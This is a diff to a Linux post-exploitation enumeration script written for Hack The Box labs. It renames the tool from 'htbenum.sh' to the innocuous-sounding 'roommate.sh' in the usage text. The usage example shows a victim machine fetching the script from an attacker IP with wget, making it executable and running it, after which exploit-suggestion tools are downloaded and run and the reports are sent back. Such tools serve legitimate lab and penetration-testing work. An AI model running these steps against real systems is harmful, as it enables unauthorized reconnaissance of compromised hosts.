@@ -43,12 +43,12 @@ function banner () {
 
 function usage () {
 		echo -e "${GREEN} Usage:";
-		echo -e "${GREEN}         ./htbenum.sh [-u] -i IP -p port [-o directory] [-w] [-r]\n";
+		echo -e "${GREEN}         ./roommate.sh [-u] -i IP -p port [-o directory] [-w] [-r]\n";
 		echo -e "${GREEN}         htbenum is designed do Linux enumeration in environments like Hack The Box where ";
 		echo -e "${GREEN}         you do not have direct Internet access to download scripts and tools.\n";
 		echo -e "${GREEN}         It will download enumeration and exploit suggestion scripts to a Linux host and ";
 		echo -e "${GREEN}         automatically execute them, providing a saved text report for each tool, and ";
-		echo -e "${GREEN}         optionally upload the reports back top the host machine. Simply upload htbenum.sh ";
+		echo -e "${GREEN}         optionally upload the reports back top the host machine. Simply upload roommate.sh ";
 		echo -e "${GREEN}         to a host, run with the IP and port of the builtin web server hosting the tools ";
 		echo -e "${GREEN}         (or use your own), and they will be downloaded to /tmp (or an optional user-defined ";
 		echo -e "${GREEN}         directory) and executed, with report output being saved to /tmp or a custom directory.";
@@ -57,11 +57,11 @@ function usage () {
 		echo -e "${GREEN}         the update parameter in order to download all the necessary tools to the current ";
 		echo -e "${GREEN}         directory. Then start the builtin web server to host the tools and receive the reports.\n ";
 		echo -e "${GREEN} Example:";
-		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./htbenum.sh -u";
-		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./htbenum.sh -i 10.10.14.1 -p 80 -w";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/htbenum.sh";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ chmod +x ./htbenum.sh";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ ./htbenum.sh -i 10.10.14.1 -p 80 -r\n";
+		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./roommate.sh -u";
+		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./roommate.sh -i 10.10.14.1 -p 80 -w";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/roommate.sh";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ chmod +x ./roommate.sh";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ ./roommate.sh -i 10.10.14.1 -p 80 -r\n";
 		echo -e "${GREEN} Parameters:";
 		echo -e "${GREEN}         -h - View help and usage.";
 		echo -e "${GREEN}         -i IP - IP address of the listening web server used for upload and download.";
